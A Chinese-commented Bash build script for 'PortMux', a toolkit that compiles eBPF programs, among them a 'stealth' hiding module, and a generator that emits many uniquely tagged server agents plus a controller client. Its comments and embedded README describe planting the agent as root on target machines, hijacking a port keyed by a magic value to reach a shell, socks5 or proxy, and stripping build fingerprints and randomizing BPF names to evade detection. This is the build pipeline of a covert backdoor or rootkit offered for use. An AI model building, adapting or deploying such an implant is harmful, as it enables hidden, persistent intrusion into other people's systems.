#!/usr/bin/env bash
# ============================================================
#  PortMux 编译机一键脚本
#  在【任意一台机器】上编译出唯一产物 portmux-gen (生成器, 单 ELF),
#  并打包成 dist/ 发布目录 + portmux-dist.tar.gz。
#
#  实际使用流程 (目标机/控制端不需要源码、不需要 Go/clang):
#    1. 本机:   ./build.sh              (自动检查/安装 Go 与编译依赖, 编译打包)
#    2. 上传:   scp dist/portmux-gen user@控制端:/tmp/
#    3. 控制端: /tmp/portmux-gen        (交互式: 详细版/简化版 → 生成 N 个 server + 1 个 client + client.conf)
#    4. 目标机: scp server-XXXXXXXX.pm root@目标机:/opt/portmux/
#               目标机上: cd /opt/portmux && sudo ./server.sh start
#    5. 控制端: cd 输出目录 && ./client.sh (读取 client.conf 菜单) 或 ./portmux-wrap -target 名字
#
#  多目标: 运行一次 portmux-gen 即可一次生成 N 个互不相同的 server (无需反复编译)
#
#  隐蔽性: server 模板内置 gen00000 占位标识 (8 字节), 由生成器运行时等长替换为随机 8 位十六进制
#          实例标识 (BPF程序/map名/pin路径随机化)、随机 BuildID、
#          编译路径 -trimpath 抹除, 二进制不含编译机指纹
# ============================================================
set -u

RED=$(tput setaf 1 2>/dev/null || true); GREEN=$(tput setaf 2 2>/dev/null || true)
YELLOW=$(tput setaf 3 2>/dev/null || true); BLUE=$(tput setaf 4 2>/dev/null || true)
CYAN=$(tput setaf 6 2>/dev/null || true); BOLD=$(tput bold 2>/dev/null || true)
NC=$(tput sgr0 2>/dev/null || true)

ROOT="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$ROOT/build"
DIST_DIR="$ROOT/dist"
TOOLS_DIR="$ROOT/.tools"
GO_BIN="$TOOLS_DIR/go/bin/go"
GO_CMD=""
# 精确锁定 Go 版本 1.22.5 (定制内核实机验证通过, 避免盲目升级小版本)
GO_DL_VER="1.22.5"

export GOCACHE="$TOOLS_DIR/gocache"
export GOPATH="$TOOLS_DIR/gopath"
export GOMODCACHE="$TOOLS_DIR/gopath/pkg/mod"

step()  { echo "$BLUE[*]$NC $1"; }
ok()    { echo "$GREEN[√]$NC $1"; }
warn()  { echo "$YELLOW[!]$NC $1"; }
err()   { echo "$RED[×]$NC $1"; }
title() { echo "$BOLD$CYAN$1$NC"; }
die()   { err "$1"; exit 1; }

ask_yn() {
  if [ "${PORTMUX_YES:-}" = "1" ]; then echo "y"; return; fi
  read -p "$YELLOW $1 [y/N]: $NC" ans
  echo "$ans"
}

ver_ge() {
  [ "$(printf '%s\n' "$2" "$1" | sort -V | head -1)" = "$2" ]
}

# ---------- Go 环境: 系统 Go → 项目自带 Go → 询问下载 (版本精确锁定) ----------
ensure_go() {
  local ver
  if command -v go >/dev/null 2>&1; then
    ver=$(go version | awk '{print $3}' | sed 's/^go//')
    if [ "$ver" = "$GO_DL_VER" ]; then GO_CMD="go"; return 0; fi
    warn "系统 Go $ver 与锁定版本 $GO_DL_VER 不一致 (vDSO 兼容性), 改用项目内置 Go"
  fi
  if [ -x "$GO_BIN" ]; then
    ver=$("$GO_BIN" version | awk '{print $3}' | sed 's/^go//')
    if [ "$ver" = "$GO_DL_VER" ]; then GO_CMD="$GO_BIN"; return 0; fi
    warn "内置 Go $ver 与锁定版本 $GO_DL_VER 不一致, 重新下载"
    rm -rf "$TOOLS_DIR/go"
  fi
  step "下载锁定版本 Go $GO_DL_VER (定制内核 vDSO 兼容性要求, 详见脚本注释)..."
  ans=$(ask_yn "是否自动下载 Go $GO_DL_VER 到项目目录 $TOOLS_DIR/go ? (无需 sudo)")
  if [ "$ans" != "y" ] && [ "$ans" != "Y" ]; then
    die "未安装 Go, 无法编译"
  fi
  local goarch
  case "$(uname -m)" in
    x86_64)  goarch="amd64" ;;
    aarch64) goarch="arm64" ;;
    *) die "不支持的 CPU 架构: $(uname -m)" ;;
  esac
  step "下载 Go $GO_DL_VER (linux-$goarch), 约 70MB..."
  mkdir -p "$TOOLS_DIR"
  curl -fL -o "$TOOLS_DIR/go.tgz" "https://go.dev/dl/go$GO_DL_VER.linux-$goarch.tar.gz" || die "下载失败, 请检查网络"
  tar -C "$TOOLS_DIR" -xzf "$TOOLS_DIR/go.tgz" || die "解压失败"
  rm -f "$TOOLS_DIR/go.tgz"
  ok "Go 安装完成 → $GO_BIN"
  GO_CMD="$GO_BIN"
  return 0
}

# ---------- 编译依赖 ----------
check_deps() {
  step "检查编译依赖..."
  local missing=""
  command -v clang >/dev/null 2>&1 || missing="$missing clang"
  [ -f /usr/include/bpf/bpf_helpers.h ] || missing="$missing libbpf-dev"
  [ -f /usr/include/linux/bpf.h ] || missing="$missing linux头文件"
  command -v curl >/dev/null 2>&1 || missing="$missing curl"
  if [ -n "$missing" ]; then
    warn "缺少编译依赖:$missing"
    ans=$(ask_yn "是否通过 apt 安装 (需要 sudo)?")
    if [ "$ans" != "y" ] && [ "$ans" != "Y" ]; then die "缺少依赖, 无法编译"; fi
    sudo apt-get update || die "apt-get update 失败"
    sudo apt-get install -y clang llvm libbpf-dev curl || die "apt 安装失败"
    ok "编译依赖安装完成"
  else
    ok "编译依赖齐全"
  fi
}

# ---------- 主流程 ----------
main() {
  title "=============================================="
  title "   PortMux 编译机一键打包"
  title "=============================================="
  cd "$ROOT"
  ensure_go || exit 1
  check_deps || exit 1

  step "检查编译时配置 (路由规则/指纹/后端端口嵌入二进制)..."
  if [ ! -f cmd/agent/config.yaml ]; then
    cp config.example.yaml cmd/agent/config.yaml
    warn "已从 config.example.yaml 生成 cmd/agent/config.yaml (默认规则: shell/socks5/HTTP代理→127.0.0.1:80)"
  fi
  ok "使用 cmd/agent/config.yaml (规则在编译时嵌入; 网卡/端口/密钥可在目标机 server.sh start 时交互指定)"
  if [ "${PORTMUX_SKIP_CONFIRM:-}" != "1" ]; then
    read -p "$YELLOW 若需修改规则请先编辑该文件, 继续编译? [回车继续 / Ctrl+C 取消]: $NC" _
  fi

  step "写入占位实例标识 gen00000 (8 字节, 与生成器的 8 位十六进制随机标识等长, 保证字节级替换不改动二进制布局)..."
  TOKEN="gen00000"
  BUILDID=$(head -c16 /dev/urandom | od -An -tx1 | tr -d ' \n')
  cp internal/bpf/token_gen.go /tmp/token_gen.go.bak
  printf 'package bpf\n\n// Token 编译期占位标识 (build.sh 写入, 由 portmux-gen 运行时随机替换)\nconst Token = "%s"\n' "$TOKEN" > internal/bpf/token_gen.go
  ok "占位标识: $TOKEN (buildid: $BUILDID)"

  step "编译 eBPF 程序 (含 stealth 隐藏模块)..."
  # -fdebug-prefix-map: 抹掉 .o 内嵌的源文件绝对路径 (编译机信息), 只留相对路径
  clang -target bpf -DPM_TOKEN=$TOKEN -O2 -g -Wall -fdebug-prefix-map="$ROOT"=. -I./bpf -I/usr/include -I/usr/include/x86_64-linux-gnu \
    -c bpf/portmux.bpf.c -o internal/bpf/portmux.bpf.o || die "BPF 编译失败"
  clang -target bpf -D__TARGET_ARCH_x86 -DPM_TOKEN=$TOKEN -O2 -g -Wall -fdebug-prefix-map="$ROOT"=. -I./bpf -I/usr/include -I/usr/include/x86_64-linux-gnu \
    -c bpf/stealth.bpf.c -o internal/bpf/stealth.bpf.o || die "stealth BPF 编译失败"
  ok "BPF → internal/bpf/portmux.bpf.o + stealth.bpf.o"

  step "编译 server 模板 (agent)..."
  mkdir -p "$BUILD_DIR"
  local modflag=""
  [ -d vendor ] && modflag="-mod=vendor"
  CGO_ENABLED=0 "$GO_CMD" build $modflag -trimpath -ldflags="-s -w -buildid=$BUILDID" -o "$BUILD_DIR/server.tmpl" ./cmd/agent/ || die "agent 编译失败"
  ok "server 模板 → $BUILD_DIR/server.tmpl"

  step "编译 client 模板 (wrap)..."
  CGO_ENABLED=0 "$GO_CMD" build $modflag -trimpath -ldflags="-s -w -buildid=$BUILDID" -o "$BUILD_DIR/wrap.tmpl" ./cmd/wrap/ || die "wrap 编译失败"
  ok "client 模板 → $BUILD_DIR/wrap.tmpl"

  step "复制模板到 cmd/gen (go:embed 嵌入生成器)..."
  cp "$BUILD_DIR/server.tmpl" cmd/gen/server.tmpl
  cp "$BUILD_DIR/wrap.tmpl" cmd/gen/wrap.tmpl
  ok "模板 → cmd/gen/server.tmpl + cmd/gen/wrap.tmpl"

  step "编译生成器 portmux-gen (单 ELF)..."
  CGO_ENABLED=0 "$GO_CMD" build $modflag -trimpath -ldflags="-s -w -buildid=$BUILDID" -o "$BUILD_DIR/portmux-gen" ./cmd/gen/ || die "portmux-gen 编译失败"
  ok "生成器 → $BUILD_DIR/portmux-gen"

  # 恢复默认 token 文件, 保持仓库干净 (模板已携带 gen00000 占位标识)
  mv /tmp/token_gen.go.bak internal/bpf/token_gen.go

  step "打包发布目录..."
  rm -rf "$DIST_DIR"
  mkdir -p "$DIST_DIR"
  cp "$BUILD_DIR/portmux-gen" "$DIST_DIR/portmux-gen"
  cp "$ROOT/server.sh" "$DIST_DIR/server.sh"
  cp "$ROOT/client.sh" "$DIST_DIR/client.sh"
  cp "$ROOT/config.example.yaml" "$DIST_DIR/config.example.yaml"
  chmod +x "$DIST_DIR/portmux-gen" "$DIST_DIR/server.sh" "$DIST_DIR/client.sh"

  cat > "$DIST_DIR/README.txt" <<EOF
PortMux 单 ELF 生成器使用说明
=============================
dist/portmux-gen 是唯一编译产物, 在控制端(或任意 Linux 机器)上运行:

  交互式: ./portmux-gen
  批量:   ./portmux-gen -batch 输出目录 -yes

运行一次生成器会输出 (互不相同的 N 个目标端 + 1 个控制端 + 1 份配置):
  server-XXXXXXXX.pm   → 目标端 agent (每个实例标识都不同, 目标机直接运行)
  portmux-wrap         → 控制端客户端
  client.conf          → 客户端配置 (client.sh 读取后生成目标菜单)

目标端部署 (目标机):
  scp server-XXXXXXXX.pm root@目标机:/opt/portmux/
  目标机上: cd /opt/portmux && sudo ./server.sh start
  (目标机不需要源码/Go/clang, 只需要 root + tc/iptables 命令)

控制端使用 (控制端):
  cd 输出目录 && ./client.sh          (读取 client.conf, 菜单选择目标)
  或 ./portmux-wrap -target 目标名    (直接连接)

注意:
  - 每次运行 portmux-gen 生成的 N 个 server 的 8 位十六进制实例标识各不相同;
  - server 二进制不含编译机任何路径/用户信息 (-trimpath 编译);
  - 网卡/劫持端口/magic_key 在生成时写入 (或目标机 server.sh start 时交互指定);
  - 客户端与目标机的 magic_key 必须一致 (已写入 client.conf);
  - 通信默认 XChaCha20-Poly1305 流加密 (密钥由 magic_key 派生)。
EOF
  ok "发布目录: $DIST_DIR"

  step "生成压缩包..."
  tar czf portmux-dist.tar.gz -C "$ROOT" dist
  ok "portmux-dist.tar.gz ($(du -h portmux-dist.tar.gz | cut -f1))"

  echo
  title "完成! 使用方式:"
  echo "  $GREEN scp dist/portmux-gen user@控制端:/tmp/ && chmod +x /tmp/portmux-gen$NC"
  echo "  或整包: $GREEN scp portmux-dist.tar.gz user@控制端:/tmp/$NC"
  echo
  ok "单 ELF 生成器就绪: 运行 portmux-gen 一次生成 N 个 server + 1 个 client + client.conf"
}

main "$@"
